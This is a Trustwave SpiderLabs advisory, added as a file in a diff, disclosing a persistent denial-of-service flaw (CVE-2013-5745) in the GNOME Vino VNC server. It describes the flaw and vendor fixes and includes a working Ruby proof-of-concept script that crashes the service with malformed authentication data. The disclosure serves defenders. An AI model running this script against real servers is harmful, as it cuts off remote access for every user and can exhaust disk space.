@@ -1,0 +1,147 @@
+Trustwave SpiderLabs Security Advisory TWSL2013-028:
+Persistent Denial of Service Vulnerability in Vino VNC Server
+
+Published: 09/16/13
+Version: 1.0
+
+Vendor: The GNOME Project (https://wiki.gnome.org/Vino)
+Product: Vino VNC Server
+Version affected: Vino VNC Server 3.7.3 and earlier versions (3.8 stable
+release is affected if encryption is disabled).
+
+Product description:
+Vino is the GNOME desktop sharing server.
+
+Finding 1: Remote Persistent Denial of Service Vulnerability
+Credit: Jonathan Claudius of Trustwave SpiderLabs
+CVE: CVE-2013-5745
+CWE: CWE-20
+
+The Vino VNC server, which is also the default VNC server in Ubuntu
+(3.4.2-0ubuntu1.2), is vulnerable to a persistent denial of service
+vulnerability.  The vulnerability is triggered when a VNC client, who
+claims to only support protocol version 3.3, sends malformed data during
+the authentication selection stage of the authentication process.
+
+If this process is repeated more than just a couple times, it causes Vino
+VNC server to fall into what appears to be an infinite loop, as seen in the
+service logs via repeating "Authentication deferred - ignoring client
+message" messages.  This not only affects the connecting client IP, but
+affects service level availability for all potential VNC clients and the
+service fails to handle any new VNC client requests regardless of client
+IP.
+
+The Vino VNC server must be restarted in order to restore VNC service
+availability.
+
+Additionally, after the failure condition has occurred, the log file
+(~/.xsession-errors) grows quickly to 1GB within 4min in testing.  If left
+unattended in the failure state, a system wide denial of service due to
+file system consumption is possible.
+
+Example:
+
+The following Proof of Concept (PoC) connects to the Vino VNC Server, sends
+a client banner, and then sends a malformed payload of repeating A's.
+After the first 3-4 payloads are sent, the port will remain open, but the
+service will fail to handle any new client requests from any client on any
+IP.
+
+
+## vino-vnc-dos-poc.rb ####
+
+require 'socket'
+require 'timeout'
+
+# Just a couple payloads in a row should be enough to send Vino into an
+# (authentication deferred - ignoring client message loop) and spoil the party
+client_banners = []
+10.times {client_banners << "RFB 003.003"}
+
+client_banners.each do |client_banner|
+  puts "Testing " + client_banner
+
+  begin
+
+    Timeout::timeout(5) {
+      sock = TCPSocket.open("a.b.c.d", 5900)
+      puts "Waiting for Server Banner..."
+
+      banner = sock.gets()
+      puts "Got Server Banner: " + banner
+      sock.write(client_banner + "\n")
+
+      payload = "A" * 16
+      puts "Sending Payload: " + payload
+      sock.write(payload)
+
+      sock.close
+    }
+
+  rescue Timeout::Error
+    puts "Operations are timing out, you may have DoS'd the service"
+  rescue Errno::ECONNREFUSED
+    puts "Cannot connect to service, this is likely an IP/Port mismatch"
+    exit
+  end
+
+end
+
+############################
+
+Remediation Steps:
+The vendor has released a fix in commit 51435d3f946d6d2b99b876b7919b9d41022fc408 and
+commit 860337231eaccfeed4f857afd0579546a260c23f for the Vino VNC Server.
+
+Vendor Communication Timeline:
+9/10/13 - Vulnerability disclosed to vendor
+9/11/13 - Patch released by vendor
+9/16/13 - Advisory published
+
+Additional Credits: BitBlaze Group (http://bitblaze.cs.berkeley.edu/)
+Initial discovery of the denial of service vulnerability in Vino
+2.26.1 and 2.32.1
+
+
+References
+1. https://wiki.gnome.org/Vino
+2. https://bugzilla.gnome.org/show_bug.cgi?id=707905
+3. https://bugzilla.gnome.org/show_bug.cgi?id=641811
+
+
+About Trustwave:
+Trustwave is the leading provider of on-demand and subscription-based
+information security and payment card industry compliance management
+solutions to businesses and government entities throughout the world. For
+organizations faced with today's challenging data security and compliance
+environment, Trustwave provides a unique approach with comprehensive
+solutions that include its flagship TrustKeeper compliance management
+software and other proprietary security solutions. Trustwave has helped
+thousands of organizations--ranging from Fortune 500 businesses and large
+financial institutions to small and medium-sized retailers--manage
+compliance and secure their network infrastructure, data communications and
+critical information assets. Trustwave is headquartered in Chicago with
+offices throughout North America, South America, Europe, Africa, China and
+Australia. For more information, visit https://www.trustwave.com
+
+About Trustwave SpiderLabs:
+SpiderLabs(R) is the advanced security team at Trustwave focused on
+application security, incident response, penetration testing, physical
+security and security research. The team has performed over a thousand
+incident investigations, thousands of penetration tests and hundreds of
+application security tests globally. In addition, the SpiderLabs Research
+team provides intelligence through bleeding-edge research and proof of
+concept tool development to enhance Trustwave's products and services.
+https://www.trustwave.com/spiderlabs
+
+Disclaimer:
+The information provided in this advisory is provided "as is" without
+warranty of any kind. Trustwave disclaims all warranties, either express or
+implied, including the warranties of merchantability and fitness for a
+particular purpose. In no event shall Trustwave or its suppliers be liable
+for any damages whatsoever including direct, indirect, incidental,
+consequential, loss of business profits or special damages, even if
+Trustwave or its suppliers have been advised of the possibility of such
+damages. Some states do not allow the exclusion or limitation of liability
+for consequential or incidental damages so the foregoing limitation may not
+apply.
